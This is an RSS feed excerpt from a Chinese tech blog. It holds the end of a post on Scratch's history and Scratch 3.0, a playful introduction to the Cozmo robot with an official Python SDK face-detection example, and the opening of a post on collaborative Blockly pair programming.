&lt;p&gt;在Scratch你能够轻松地导入或绘制人物、录制并调制声音、调用摄像头或是现实中的各种传感器！&lt;/p&gt;
&lt;h4&gt;社区: 分享与合作&lt;/h4&gt;
&lt;p&gt;雷斯尼克和同事在编写和设计Scratch软件的4年里，波士顿众多计算机俱乐部的孩子们经常在他们的办公室穿梭，带给他们很多灵感，Scratch是很多人共同努力的结晶，他们在Scratch中将社群功能融入软件的核心&lt;/p&gt;
&lt;p&gt;Scratch的口号是:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Imagine, Program, Share&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对"Share"的重视可以追溯到开源运动和黑客文化。Scratch诞生自MIT，而MIT有着悠久的黑客文化&lt;/p&gt;
&lt;p&gt;60年代初，第一批"MIT黑客"将他们写的程序存储在磁带上，随意的放在实验室的抽屉里，任何人都可以自由地使用磁带，将其放到自己的计算机里，学习代码、更新和改进，然后再将传给磁带留给下一个人，大家在这个过程中互相学习，共同改进程序，他们认为这是学习编程最佳的方法。在《大教堂与集市》中，作者从经济学角度论证了，这也是构建高质量软件的最佳方法&lt;/p&gt;
&lt;p&gt;弗莱德·摩尔曾明确地将家酿计算机俱乐部定位成一个信息交换中心。信息应该在俱乐部成员之间自由传递，就像在一台精心设计的计算机内无拘无束流动着的二进制位一样。黑客们都奉行与计算机本身雅致的逻辑相一致的理念——共享、开放、分权，以及亲自动手改进机器并改善整个世界&lt;/p&gt;
&lt;p&gt;这种分享与合作的的精神一直在黑客社区流传，之后的开源运动、今天的github都是它的产物。对这段历史有兴趣的同学可以参看《黑客:计算机革命的英雄》。&lt;/p&gt;
&lt;p&gt;人工智能的开拓者马文·明斯基曾说："Logo语言的问题是它只有语法而没有文本。" 他的意思是，Logo语言缺少被认可、推崇和复制的可能性，这样一来Share变的艰难。而Scratch改进了这点,它继承了这种合作、开放、分享的黑客文化，在Scratch中你可以从0开始一个自己的项目，也可以看看是不是有其他人做过你想做的事，尝试在Ta的基础上做些调整以符合自己的需要。如果遇到问题，便在社区中和作者交流。当然反馈你更好的解决方法，他将因为作品被改进而感激你。如此一来，社区成为了淘金、合作、激发热情和学习技巧的绝佳场所。&lt;/p&gt;
&lt;p&gt;关于合作与分享，雷斯尼克在&lt;a href="http://learn.media.mit.edu/lcl/weeks/week4/"&gt;LCL peers&lt;/a&gt;中有做深入探讨&lt;/p&gt;
&lt;h1&gt;未来 : Scratch3.0&lt;/h1&gt;
&lt;p&gt;Scratch经历了基于Squeak编写的1.x版本；基于ActionScript编写的2.0版本(依赖flash)，如今即将迈向3.0（明年春发布）&lt;/p&gt;
&lt;p&gt;Scratch将基于html5技术，能够轻松跨平台运行，十分可期。目前的开发版可以在&lt;a href="https://llk.github.io/scratch-gui/"&gt;这儿尝鲜&lt;/a&gt;. 对源码有兴趣的小伙伴，想围观或者参与，都可以&lt;a href="https://github.com/LLK"&gt;戳这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Google与MIT Media Lab将共同开发Scratch Blocks，Scratch Blocks使用谷歌的可视化编程语言Blockly(关于Blockly可以看我之前的这篇文章: &lt;a href="http://blog.just4fun.site/blockly-overview.html"&gt;blockly入门与介绍&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;使用Blockly积木块之后，Scratch将变的更加灵活、美观和易拓展，拼搭好的积木块可以直接转译为6门语言，而这些语言将直接运行在合适的地方（目前许多硬件都能直接运行Python和JavaScript）。Scratch将出现在更多的现实场景中，也许某一天你可以通过拖拽积木来自定义你的新家或是为你的机器管家编程，而目前你已经可以用它控制Cozmo、四轴飞行器。目前也有一些AI公司尝试用积木来封装他们的AI接口，让用户可以更方便地搭建出他们的AI项目。&lt;/p&gt;
&lt;p&gt;所有试图将复杂度隐藏、给用户暴露出直观易用接口、同时还想保留足够灵活度的项目，都可能受益于Scratch/Blockly&lt;/p&gt;
&lt;p&gt;积木化的编程方式是领域无关的，这种封装/抽象的思想，能恰当地屏蔽复杂度，仅将用户需要的东西暴露为可组合的积木块（很符合Unix设计哲学），如果我们使用得当，我们可以将大多数的事物封装为Scratch积木，任何对创造有热情的人都可以去自定义和改写他的生活，这大概是maker们梦想的天堂。&lt;/p&gt;
&lt;h1&gt;尾声&lt;/h1&gt;
&lt;p&gt;我们以雷斯尼克的一次演讲来结束本文&lt;/p&gt;
&lt;p&gt;雷斯尼克在一次演讲中，一位听众起身问了一个问题&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;西蒙·派珀特20年前不也在做同样的事情吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这句话当然不是恭维，而是暗示雷斯尼克的想法已经过时了。&lt;/p&gt;
&lt;p&gt;雷斯尼克回答说&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对，我做的正是西蒙·派珀特20年前做的事情。我认为这是值得继续做的事。我们正在取得一些进展。如果我的余生一直做这些事，我会感到快乐和自豪，因为它们重要到我非做不可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E4%BC%8A%E8%97%A4%E7%A9%B0%E4%B8%80"&gt;wikipedia 伊藤穰一&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E7%9C%81%E7%90%86%E5%B7%A5%E5%AA%92%E4%BD%93%E5%AE%9E%E9%AA%8C%E5%AE%A4"&gt;wikipedia 麻省理工媒体实验室&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/Scratch"&gt;wikipedia Scratch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ted.com/talks/mitch_resnick_let_s_teach_kids_to_code"&gt;Let's teach kids to code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Mitchel_Resnick"&gt;Mitchel Resnick&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.scratch.mit.edu/wiki/Scratch_3.0"&gt;Scratch 3.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Seymour_Papert"&gt;Seymour Papert&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/Logo%E8%AF%AD%E8%A8%80"&gt;Logo语言&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%AE%93%C2%B7%E7%9A%AE%E4%BA%9E%E5%82%91"&gt;wikipedia 让·皮亚杰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%8F%91%E5%B1%95%E5%BF%83%E7%90%86%E5%AD%A6发展心理学"&gt;wikipedia 发展心理学&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E8%AA%8D%E7%9F%A5%E7%99%BC%E5%B1%95%E8%AB%96"&gt;wikipedia 认知发展论&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%BB%BA%E6%A7%8B%E4%B8%BB%E7%BE%A9_(%E5%AD%B8%E7%BF%92%E7%90%86%E8%AB%96)"&gt;wikipedia 建构主义&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yangfenzi.com/news/64397.html"&gt;人工智能先驱、LOGO语言创始人西蒙·派珀特(Papert)去世&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://web.media.mit.edu/~mres/papers/scratch-proposal.pdf"&gt;A Networked, Media-Rich Programming Environment to Enhance Technological Fluency at After-School Centers  in Economically-Disadvantaged Communities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://learn.media.mit.edu/lcl/"&gt;Learning Creative Learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 07 Dec 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-12-07:scratch.html</guid><category>scratch-history</category></item><item><title>cozmo系列之入门 - 有性格且可编程的机器人</title><link>/cozmo-hello-world.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo92f55c7b.png" /&gt;&lt;/p&gt;
&lt;p&gt;可编程的机器人不少，灵活而友好的却不多&lt;/p&gt;
&lt;p&gt;不智障的机器人不多，有性格的就更少&lt;/p&gt;
&lt;p&gt;可爱的机器人中我最中意2款: BB8和cozmo&lt;/p&gt;
&lt;p&gt;BB8可爱且呆，cozmo可爱又任性&lt;/p&gt;
&lt;p&gt;来个它们的合影&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo1a05d914.png" /&gt;&lt;/p&gt;
&lt;h1&gt;你的电子宠物&lt;/h1&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmoba993abb.png" /&gt;&lt;/p&gt;
&lt;p&gt;这个憨态可掬的机器人，有些像微缩版的瓦力，不过它可没瓦力乖巧&lt;/p&gt;
&lt;p&gt;它从睡眼惺忪中醒来，伸伸懒腰，便下床(充电座)自顾自地玩耍，它有自个儿的玩具(发光方块)，如果你有时间，愿意陪它做游戏，它会很开心，赢了得意忘形，输了就捶胸顿足，得失心这么重，恐怕不适合炒股&lt;/p&gt;
&lt;p&gt;如果你没空陪它，也无妨，它闲庭信步，吹吹口哨、哼哼小曲儿;闲着无聊，便来回搬运自己的玩具，堆叠起来或是一把推翻，自得其乐。除了不尿裤子，其他方面都像极了你六岁时的样子&lt;/p&gt;
&lt;p&gt;想找你玩，而你又没空的时候，它会来一出苦情戏，走到桌子边缘，假装要掉下去，真站到边缘，又会被自己吓一跳，忙往回缩，这样的演技恐怕只适合拍偶像剧了&lt;/p&gt;
&lt;h2&gt;唤醒&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo15948ba5.png" /&gt;&lt;/p&gt;
&lt;p&gt;将cozmo放在通电的基座上，手机连上cozmo发射出来的wifi热点(形如Cozmo_542CA8),打开app(Cozmo)选择连接，cozmo将被唤醒：睡眼惺忪，伸伸懒腰，懒洋洋地下床&lt;/p&gt;
&lt;p&gt;你家里从此多了一个调皮的小伙伴&lt;/p&gt;
&lt;h2&gt;下床(自主模式）&lt;/h2&gt;
&lt;p&gt;Cozmo下床之后，默认的模式是自顾自的玩耍（自主模式），它四处打量着新家，充满了好奇，遇到新奇之物，忍不住要发出"哇"的赞叹，尾音拖的老长，赞叹之情想来发自肺腑。&lt;/p&gt;
&lt;p&gt;你可以将家庭成员录入它的视觉系统，这样在它玩耍之余，看到熟人，会有礼貌地打个招呼，只是在它喊出名字的时候，略带一点外星口音。你会慢慢习惯的，如果你在银河系漫游久了就知道，带点自己母星的口音再正常不过了。不过Cozmo的一些自言自语我还不大能听懂，《银河系漫游指南》里也没做记载。&lt;/p&gt;
&lt;h2&gt;交互&lt;/h2&gt;
&lt;p&gt;新版的app(我的当前版本是2.0.2)相比1.0有明显调整，显著的变化是更强调陪伴和共同成长。它就像你的宠物一样，你得注意它是不是生病了(需要修复)，是不是饿了(给它喂食)，如果它饥寒交加，身体不适，它是拒绝同你一起做游戏的.&lt;/p&gt;
&lt;h3&gt;被驯服的小狐狸&lt;/h3&gt;
&lt;p&gt;Cozmo有时候像一只被驯服的小狐狸&lt;/p&gt;
&lt;p&gt;有一回小狐狸对小王子解释&lt;code&gt;驯服&lt;/code&gt;二字的含义(《小王子》)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这是已经早就被人遗忘了的事情……它的意思就是'建立联系'……对我来说，你还只是一个小男孩，就像其他千万个小男孩一样。我不需要你,你也同样用不着我。对你来说，我也不过是一只狐狸，和其他千万只狐狸一样。但是，如果你驯服了我，我们就互相不可缺少了。对我来说，你就是世界上唯一的了；我对你来说，也是世界上唯一的了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你们相处愉快，每天一起玩耍，它虽时而捣蛋，在你忧愁的时候也是很乐意取悦你的，你可以要求它：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cozmo给我表演一下叠罗汉&lt;/li&gt;
&lt;li&gt;Cozmo我要看你鲤鱼打挺&lt;/li&gt;
&lt;li&gt;Cozmo过来我们击个拳&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;cozmo的技能树十分丰富，需要你和它共同点亮&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo12cebfe0.png" /&gt;&lt;/p&gt;
&lt;h3&gt;一起做游戏&lt;/h3&gt;
&lt;p&gt;Cozmo自娱自乐玩腻了，会主动邀请你跟它一起玩游戏，就像你儿时玩伴那样。cozmo随身携带的三个积木，将成为你们的游戏道具，你们将狭路相逢，比拼记忆力或反应速度，调动你的肌肉和大脑，记得当心Cozmo的小心思！它可是会耍诈的&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo8de54d8a.png" /&gt;&lt;/p&gt;
&lt;p&gt;做游戏时，你会注意到Cozmo的表情变化非常微妙，在游戏中聚精会神，不时皱起眉头思考。小胜一局，虽不至手舞足蹈，却也是难掩喜悦之情，眼睛弯成了月牙，若大获全胜，便开心得非原地大转三圈不可。如果你技高一筹，Cozmo极是不甘，愁眉苦脸也只是一时之态，一会儿便重振旗鼓，立马拉着你再战一局，像不像被你带着打排位赛却铩羽而归的徒弟&lt;/p&gt;
&lt;h3&gt;听我指挥&lt;/h3&gt;
&lt;p&gt;Cozmo想不想当将军我不清楚，但据我所知，它目前是一个好士兵(听从指挥)&lt;/p&gt;
&lt;p&gt;你可以用三种方式指挥cozmo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在app中拖拽积木来指挥cozmo(用到blockly)&lt;/li&gt;
&lt;li&gt;在Explorer模式下驾驶cozmo&lt;/li&gt;
&lt;li&gt;使用SDK为Cozmo编程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们先来说说第一种，在app中拖拽积木来指挥cozmo&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo63e5b91e.png" /&gt;&lt;/p&gt;
&lt;p&gt;在这个被称为&lt;code&gt;Code Lab&lt;/code&gt;的界面里，包含了许多用来控制cozmo的积木。你可以让Cozmo前进两步，然后左拐避开前方的障碍物(一袋咖啡)，再前进，像这样&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmof70f49bd.png" /&gt;&lt;/p&gt;
&lt;p&gt;你也可以把它放在餐桌上，环顾四周，清点下用餐人数，然后告诉服务员要几份米饭。 这个任务稍微复杂些，会用到视觉、语音和移动模块，但即便是一个不识字的小孩，操作起来也无碍。所有的编程积木都带有形象化的图案，一目了然&lt;/p&gt;
&lt;h3&gt;小鬼当家&lt;/h3&gt;
&lt;p&gt;我大约9岁那年看了小鬼当家，对其中带有摄像头的遥控车念念不忘。&lt;/p&gt;
&lt;p&gt;9岁的时候不是那种能做到&lt;code&gt;想要的都拥有，得不到的都释怀&lt;/code&gt;的小孩，这件事一直放在心上，后来看到&lt;code&gt;带有摄像头的遥控车&lt;/code&gt;总忍不住要多看几眼，但都不是心里想要的，要么太过笨重，要么不够好看，机身如此不够灵巧，摄像头如此昭然若揭，这可怎么和坏人斗智斗勇&lt;/p&gt;
&lt;p&gt;直到在Cozmo中发现它的Explorer模式，才有&lt;code&gt;终于等到你&lt;/code&gt;的感觉。&lt;/p&gt;
&lt;p&gt;在Explorer模式中，你可以驾驶着Cozmo在自家的庭院或房间里冒险。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo858d7212.png" /&gt;&lt;/p&gt;
&lt;p&gt;你拉上窗帘，手握ipad，如坐在星际战舰的指挥室里，窗外的星光稀疏极了，毕竟身处银河系荒凉偏僻的旋臂上。屏幕里展示着Cozmo从前线发来的视频信号。屏幕上光线晦暗，你手握方向盘，指挥着cozmo继续探索这片应许之地,突然，屏幕中一闪而过一个庞然大物，距离近时，身躯之大，足足占了屏幕的1/3。而动作敏捷，倏忽之间，跃出屏幕之外，来去无影，着实吓了你一跳。气势真如沈复说的"忽有庞然大物，拔山倒树而来"。待你定下神来，操控Cozmo追踪不明生物，竟破解了一个惊天谜团&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;妈，你早上买的鱼被我们家的猫偷藏在床底下了，人赃俱获，我已经用Cozmo拍到它躲在床底下吃鱼的照片了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;刘瑜在《送你一颗子弹》中感慨:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;15岁的时候再得到那个5岁的时候热爱的洋娃娃，65岁的时候终于有钱买25岁的时候热爱的那条裙子，又有什么意义呢？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这句话对我不大适用，我终于遇到9岁的时热爱的遥控车之后，恨不能像Cozmo一样原地大转三圈&lt;/p&gt;
&lt;h3&gt;code!&lt;/h3&gt;
&lt;p&gt;如果cozmo预设的所有功能都不足以填满你的脑洞，那么你就应该撸起袖子开始编程了。代码可能是这个星球上可玩性最高的玩具。&lt;/p&gt;
&lt;p&gt;cozmo为你准备好了&lt;a href="https://github.com/anki/cozmo-python-sdk"&gt;cozmo-python-sdk&lt;/a&gt;，有了它，你就可以使用Python来驱动Cozmo，如果你愿意，可以接入OpenCV或是TensorFlow，社区已经有人用Tensorflow CNN 训练出来的模型自动驾驶cozmo了。&lt;/p&gt;
&lt;p&gt;下边我们来看看怎么用代码驱动Cozmo&lt;/p&gt;
&lt;p&gt;首先在你的app中启动SDK模式&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo6f84d476.png" /&gt;&lt;/p&gt;
&lt;p&gt;接着就可以在你的电脑上用python来为Cozmo编程。关于这块的原理我们今后再聊，Cozmo在易用性和灵活性上花了很多功夫，编程体验很惊艳&lt;/p&gt;
&lt;p&gt;下边这个例子是官方源码里包含的示例，源码如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cozmo&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;light_when_face&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;cozmo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Robot&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;The core of the light_when_face program&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="c1"&gt;# Move lift down and tilt the head up&lt;/span&gt;
    &lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;move_lift&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_head_angle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cozmo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MAX_HEAD_ANGLE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wait_for_completed&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;face&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Press CTRL-C to quit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;face&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;face&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_visible&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_all_backpack_lights&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cozmo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lights&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;blue_light&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_backpack_lights_off&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

            &lt;span class="c1"&gt;# Wait until we we can see another face&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;face&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;robot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;wait_for_observed_face&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TimeoutError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Didn&amp;#39;t find a face.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt;

        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;cozmo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_program&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;light_when_face&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;use_viewer&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;force_viewer_on_top&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段代码实现了这样一个功能: 当cozmo的视觉系统识别到人脸时(对应代码&lt;code&gt;if face and face.is_visible:&lt;/code&gt;)，将背部的灯设置为蓝色(对应代码&lt;code&gt;robot.set_all_backpack_lights(cozmo.lights.blue_light)&lt;/code&gt;)。即使你没有编程经验，也能大致看懂上边这段代码在干嘛，这也是Cozmo的作者选择Python的原因，这门编程语音以接近自然语言(英语)的方式来书写，让你轻松上手。&lt;/p&gt;
&lt;p&gt;就这点而言，Cozmo也是入门编程的理想工具(这是一种反馈强烈的编程体验，让你乐在其中，而不至于被语法和逻辑吓跑)&lt;/p&gt;
&lt;p&gt;我们来看看代码实现的效果:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/cozmo00576e90.png" /&gt;&lt;/p&gt;
&lt;p&gt;当然你可以发挥想象，将代码改造为：当Cozmo识别到人脸时，主动给你发一封邮件,如此一来在你们一家人出旅行时，它就负责看家&lt;/p&gt;
&lt;p&gt;又或者，你可以驱动它走到门口迎接找你玩的小伙伴，看到小伙伴时(&lt;code&gt;if face and face.is_visible&lt;/code&gt;)打个招呼，接着让Cozmo带他到你的卧室&lt;/p&gt;
&lt;h2&gt;后续&lt;/h2&gt;
&lt;p&gt;接下来的一段时间，我准备做一次长途路行，途中会继续写Cozmo系列文章&lt;/p&gt;
&lt;p&gt;选材原则是有趣，具体内容待定，大概会和机器视觉、语音识别、积木化编程(blockly)、编程教育相关&lt;/p&gt;
&lt;p&gt;如果你有好的想法，关于想用Cozmo做好玩的东西，欢迎给我邮件(wuwenjie718@gmail.com)，我在途中所经之处，只要有网络，每晚都会查阅邮件 : )&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 18 Oct 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-10-18:cozmo-hello-world.html</guid><category>cozmo</category></item><item><title>blockly与结对编程</title><link>/blockly-pair-programming.html</link><description>&lt;p&gt;&lt;img alt="" src="http://os54tv4fc.bkt.clouddn.com/blockly_socket.gif" /&gt;&lt;/p&gt;
&lt;h1&gt;引言&lt;/h1&gt;
&lt;p&gt;前些日子google刚发布了blockly1.0，社区人气一路上升，我集中时间逛了下开发者社区(&lt;a href="https://groups.google.com/forum/#!forum/blockly"&gt;developer forum&lt;/a&gt;)，发现好些有意思的开源项目，有不少我手边的工作都用得到,能省下许多的时间,逛开发者社区常有意外的惊喜,比刷朋友圈有趣多了&lt;/p&gt;
&lt;p&gt;下文我们将提到的&lt;a href="https://github.com/ucanbaklava/socketblockly"&gt;socketblockly&lt;/a&gt;便来自社区&lt;/p&gt;
&lt;h1&gt;结对编程&lt;/h1&gt;
&lt;p&gt;按维基百科的说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;结对编程（英语：Pair programming）是一种敏捷软件开发的方法，两个程序员在一个计算机上共同工作。一个人输入代码，而另一个人审查他输入的每一行代码。输入代码的人称作驾驶员，审查代码的人称作观察员&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我个人很喜欢结对编程。甚至远程协作的时候,我也喜欢和朋友一起登陆到服务器，一起进入同个tmux session(你可能更喜欢&lt;a href="https://github.com/zolrath/wemux"&gt;wemux&lt;/a&gt;，如果你爱折腾甚至可以试试&lt;a href="https://github.com/FredKSchott/CoVim"&gt;CoVim&lt;/a&gt;)，手边打开微信语音，编程相关的内容，大家的屏幕是彼此同步的，输入也完全同步，沟通效率远胜于任何截图(甚至好过一起聚在同个屏幕面前)。对服务器的重要的操作彼此监督，不容易出错。在工作交接的时候，这种协作方式效率也极高。甚至在公司，我也喜欢以这种方式和同事协作，一群人挤在一个屏幕面前，很不自在。共享屏幕并不需要在同个物理空间&lt;/p&gt;
&lt;p&gt;我将结对编程视为协同工作的一种,协同工作就宽泛得多了，我比较关注在线实时的协同工具（对远程办公有极大好感:) ），能够对此提供支持的工具有很多，诸如&lt;a href="https://www.google.com/intl/zh-CN/docs/about/"&gt;google文档&lt;/a&gt;、&lt;a href="https://shimo.im/"&gt;石墨文档&lt;/a&gt;、&lt;a href="https://github.com/mozilla/togetherjs"&gt;togetherjs&lt;/a&gt;等&lt;/p&gt;
&lt;p&gt;这些能用来进行协同工作的工具，也适合用来做远程教学(手把手),当然我们可能需要区分学生和老师的角色，这个是细节问题&lt;/p&gt;
&lt;h1&gt;blockly与结对编程&lt;/h1&gt;
&lt;p&gt;在blockly中我们如何实现结对编程呢？(对blockly不熟悉的小伙伴可以参考&lt;a href="http://blog.just4fun.site/blockly-overview.html"&gt;blockly入门与介绍&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;这是个很有趣的话题，乍看之下blocks是UI，似乎比协同文本更难&lt;/p&gt;
